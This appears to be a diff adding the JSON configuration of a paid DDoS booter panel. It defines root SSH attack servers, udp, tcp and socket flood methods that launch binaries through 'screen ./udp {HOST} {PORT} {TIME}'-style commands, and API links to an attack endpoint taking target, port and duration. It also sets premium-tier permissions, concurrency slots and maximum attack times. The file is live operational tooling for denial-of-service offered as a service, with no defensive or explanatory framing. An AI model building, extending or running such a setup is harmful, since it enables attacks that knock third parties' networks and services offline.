@@ -1,0 +1,175 @@
+{
+    "servers": [
+        {
+            "name": "one",
+            "host": "",
+            "port": 2222,
+            "username": "root",
+            "password": "",
+            "enabled": true
+        },
+        {
+            "name": "two",
+            "host": "",
+            "port": 22,
+            "username": "root",
+            "password": "",
+            "enabled": true
+        }
+    ],
+    "attacks": [
+        {
+            "method_name": "udp",
+            "permissions": {
+                "vip_required": true,
+                "role": "premium",
+                "require_role": false 
+            },
+            "method_enabled": true,
+            "api_funnel": [
+                {
+                    "link": [
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=udp",
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=udp"
+                    ],
+                    "max_time": 300,
+                    "enabled": true
+                }
+            ],
+            "ssh_funnel": [
+                {
+                    "servers": ["one"],
+                    "command": "screen ./udp {HOST} {PORT} {TIME}",
+                    "max_time": 300,
+                    "enabled": true
+                }
+            ],
+            "restrictions": {
+                "allowed_targets": {
+                    "url": false,
+                    "domain": false,
+                    "ipv4": true,
+                    "cidr": false
+                },
+                "access": {
+                    "info": "If both are off the method is usable via API and CNC, only enable one of the two options below",
+                    "cnc_method_only": false,
+                    "api_method_only": false
+                }
+            },
+            "method_slots": {
+                "slots": 2
+            },
+            "method_maxtime": {
+                "time": 300
+            },
+            "method_mintime": {
+                "time": 15
+            }
+        },
+        {
+            "method_name": "tcp",
+            "permissions": {
+                "vip_required": true,
+                "role": "premium",
+                "require_role": false 
+            },
+            "method_enabled": true,
+            "api_funnel": [
+                {
+                    "link": [
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=tcp",
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=tcp"
+                    ],
+                    "max_time": 300,
+                    "enabled": true
+                }
+            ],
+            "ssh_funnel": [
+                {
+                    "servers": ["one", "two"],
+                    "command": "screen ./tcp {HOST} {PORT} {TIME}",
+                    "max_time": 300,
+                    "enabled": true
+                }
+            ],
+            "restrictions": {
+                "allowed_targets": {
+                    "url": false,
+                    "domain": false,
+                    "ipv4": true,
+                    "cidr": false
+                },
+                "access": {
+                    "info": "If both are off the method is usable via API and CNC, only enable one of the two options below",
+                    "cnc_method_only": false,
+                    "api_method_only": false
+                }
+            },
+            "method_slots": {
+                "slots": 2
+            },
+            "method_maxtime": {
+                "time": 300
+            },
+            "method_mintime": {
+                "time": 15
+            }
+        },
+        {
+            "method_name": "socket",
+            "permissions": {
+                "vip_required": true,
+                "role": "",
+                "require_role": false
+            },
+            "method_enabled": true,
+            "api_funnel": [
+                {
+                    "link": [
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=socket",
+                        "https://example.com/api/attack?username=&secret=&target={HOST}&port={PORT}&time={TIME}&method=socket"
+                    ],
+                    "max_time": 600,
+                    "enabled": true
+                }
+            ],
+            "ssh_funnel": [
+                {
+                    "servers": ["one"],
+                    "command": "screen ./socket {HOST} {PORT} {TIME}",
+                    "max_time": 600,
+                    "enabled": true
+                },
+                {
+                    "servers": ["two"],
+                    "command": "screen ./tcpsocket {HOST} {PORT} {TIME}",
+                    "max_time": 600,
+                    "enabled": true
+                }
+            ],
+            "restrictions": {
+                "allowed_targets": {
+                    "url": false,
+                    "domain": true,
+                    "ipv4": false,
+                    "cidr": false
+                },
+                "access": {
+                    "info": "If both are off the method is usable via API and CNC, only enable one of the two options below",
+                    "cnc_method_only": false,
+                    "api_method_only": false
+                }
+            },
+            "method_slots": {
+                "slots": 3
+            },
+            "method_maxtime": {
+                "time": 600
+            },
+            "method_mintime": {
+                "time": 30
+            }
+        }
+    ]
+}
